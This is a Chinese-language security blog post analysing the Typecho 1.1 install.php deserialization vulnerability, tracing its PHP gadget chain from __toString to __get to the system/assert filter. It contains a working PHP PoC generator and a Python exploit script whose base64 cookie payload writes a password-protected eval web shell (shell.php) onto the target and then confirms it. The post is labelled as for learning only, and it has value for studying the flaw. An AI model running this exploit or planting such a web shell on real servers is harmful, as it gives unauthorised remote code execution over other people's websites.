@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Typecho 1.1 反序列化漏洞导致前台getshell一、漏洞简介二、漏洞影响Typecho 1.1 三、复现过程漏洞分析复现环境：PHP5.6+Apache+Windows  Typecho_Cookie::get目的是获取Cookie，可从Cookie或POST中获取">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Typecho/Typecho%201.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Typecho 1.1 反序列化漏洞导致前台getshell一、漏洞简介二、漏洞影响Typecho 1.1 三、复现过程漏洞分析复现环境：PHP5.6+Apache+Windows  Typecho_Cookie::get目的是获取Cookie，可从Cookie或POST中获取">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId25.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId26.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId27.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId28.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId29.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId30.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId32.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId33.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId34.jpg">
+<meta property="article:published_time" content="2022-07-08T06:26:06.087Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.402Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId25.jpg">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Typecho/Typecho 1.1 反序列化漏洞导致前台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Typecho/Typecho%201.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.087Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Typecho-1-1-反序列化漏洞导致前台getshell"><a href="#Typecho-1-1-反序列化漏洞导致前台getshell" class="headerlink" title="Typecho 1.1 反序列化漏洞导致前台getshell"></a>Typecho 1.1 反序列化漏洞导致前台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Typecho 1.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>复现环境：PHP5.6+Apache+Windows</p>
+<p><img src="/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId25.jpg"></p>
+<p><code>Typecho_Cookie::get</code>目的是获取Cookie，可从Cookie或POST中获取</p>
+<p><img src="/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId26.jpg"></p>
+<p>要执行到此处需要经过前面的各种判断条件：</p>
+<ol>
+<li> $_GET[‘finish’] 不为空</li>
+<li> $_SERVER[‘HTTP_REFERER’] 不为空</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- --&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>//判断是否已经安装
+if (!isset($_GET[&#39;finish&#39;]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . &#39;/config.inc.php&#39;) &amp;&amp; empty($_SESSION[&#39;typecho&#39;])) &#123;
+    exit;
+&#125;
+// 挡掉可能的跨站请求
+if (!empty($_GET) || !empty($_POST)) &#123;
+    if (empty($_SERVER[&#39;HTTP_REFERER&#39;])) &#123;
+        exit;
+    &#125;
+&#125;
+</code></pre>
+<p>接下来需要寻找利用链，常见魔法方法：</p>
+<pre><code>__construct()//创建对象时触发
+__destruct() //对象被销毁时触发
+__call() //在对象上下文中调用不可访问的方法时触发
+__callStatic() //在静态上下文中调用不可访问的方法时触发
+__get() //用于从不可访问的属性读取数据
+__set() //用于将数据写入不可访问的属性
+__isset() //在不可访问的属性上调用isset()或empty()触发
+__unset() //在不可访问的属性上使用unset()时触发
+__invoke() //当脚本尝试将对象调用为函数时触发
+__wakeup() //使用unserialize时触发
+__sleep() //使用serialize时触发
+__toString()//类当String用
+</code></pre>
+<p>误以为是通过__desctruct()和__wakeup()触发，没想到起始是利用__toString()，接着通过__get()触发。</p>
+<p>回到<code>install.php</code>中看232行中$config[‘adapter’]作为了Typecho_Db()参数，只要控制$config[‘adapter’]的值为某一个类的对象就可以触发__toString()，那么$config的值应为一个数组。</p>
+<p><img src="/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId27.jpg"></p>
+<p><img src="/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId28.jpg"></p>
+<p>接下来寻找__toString()方法，在<code>var/Typecho/Feed.php</code>中找到</p>
+<p><img src="/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId29.jpg"></p>
+<p>$item可控，如果$item[‘author’]为某个不存在screenName属性的类对象时，自动触发__get()方法<code>var/Typecho/Request.php</code>，如下图，显然可控吧~</p>
+<p><img src="/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId30.jpg"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>根据漏洞分析写出poc</p>
+<pre><code>&lt;?php
+class Typecho_Request&#123;
+    private $_params = array();
+    private $_filter = array();
+
+    public function __construct()&#123;
+        $this-&gt;_params = array(&quot;screenName&quot;=&gt;&quot;id&quot;);
+        $this-&gt;_filter = array(&quot;system&quot;);
+    &#125;
+&#125;
+
+class Typecho_Feed&#123;
+    private $_items = array();
+    private $_type;
+
+    public function __construct()&#123;
+        $this-&gt;_items = array(
+            array(
+                &quot;author&quot;=&gt;new Typecho_Request(),
+                &quot;link&quot;=&gt;&quot;link&quot;,
+                &quot;title&quot;=&gt;&quot;title&quot;,
+                &quot;date&quot;=&gt;&quot;date&quot;,
+                &quot;category&quot;=&gt;array(new Typecho_Request()),#注意点
+            )
+        );
+        $this-&gt;_type = &quot;RSS 2.0&quot;;
+    &#125;
+&#125;
+
+$a =  array(&quot;adapter&quot;=&gt;new Typecho_Feed());
+#echo serialize(($a)).&quot;\n&quot;;
+echo base64_encode(serialize(($a))).&quot;\n&quot;;
+</code></pre>
+<blockquote>
+<p>关于poc中注意点说明：</p>
+<p>在漏洞分析时并没有涉及该行相关数据，在没有这一行数据时：</p>
+<p>程序继续进入到Db.php的构造方法中，并在下图汇总抛出异常</p>
+</blockquote>
+<p><img src="/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId32.jpg"></p>
+<p>如果是命令是写入文件，则不会影响结果，但如果需要显示命令结果，则无法实现，因而考虑在抛出异常之前结束运行程序运行</p>
+<p><img src="/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId33.jpg"></p>
+<p>最终结果</p>
+<p><img src="/resource/Typecho1.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/media/rId34.jpg"></p>
+<p>Python脚本，<strong>仅用作学习目的</strong></p>
+<pre><code>import sys
+import requests
+
+class Typecho_install_getshell_Test:
+    def __init__(self,url):
+        self.url = url
+
+    def run(self):
+        headers = &#123;
+            &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36&quot;,
+            &quot;Cookie&quot;:&quot;__typecho_config=YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjU6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCc8P3BocCBAZXZhbCgkX1BPU1RbXCdwYXNzXCddKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX1zOjQ6ImxpbmsiO3M6NDoibGluayI7czo1OiJ0aXRsZSI7czo1OiJ0aXRsZSI7czo0OiJkYXRlIjtzOjQ6ImRhdGUiO3M6ODoiY2F0ZWdvcnkiO2E6MTp7aTowO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjU6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCc8P3BocCBAZXZhbCgkX1BPU1RbXCdwYXNzXCddKTs/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjE5OiIAVHlwZWNob19GZWVkAF90eXBlIjtzOjc6IlJTUyAyLjAiO319;XDEBUG_SESSION=15908&quot;,
+            &quot;Referer&quot;:self.url,
+        &#125;
+        vulnpath = self.url + &quot;/install.php?finish=1&quot;
+        try:
+            requests.get(vulnpath,headers=headers,timeout=10)
+            shellpath = self.url + &quot;shell.php&quot;
+            data = &#123;
+                &quot;pass&quot;:&quot;phpinfo();&quot;,
+            &#125;
+            re = requests.post(shellpath,headers=headers,data=data,timeout=10)
+            re.encoding = re.apparent_encoding
+            if &quot;Configure Command &quot; in re.text:
+                print(&quot;[+]Typecho反序列化漏洞存在! \nPayload: &quot;+ shellpath + &quot;\tPassWord: pass&quot;)
+            else:
+                print(&quot;[-]Typecho漏洞可能不存在!&quot;)
+        except:
+            print(&quot;[-]Something wrong!&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    Vuln = Typecho_install_getshell_Test(sys.argv[1])
+    Vuln.run()
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="http://pines404.online/2020/01/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://pines404.online/2020/01/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Typecho/Typecho%201.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E5%89%8D%E5%8F%B0getshell/" data-id="cl5c2qxca00jly8v1fazt71rm" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Typesetter%20CMS/Typesetter%20CMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Tomcat%20URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/Tomcat%E5%AF%B9URL%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%9A%84%E5%A4%84%E7%90%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
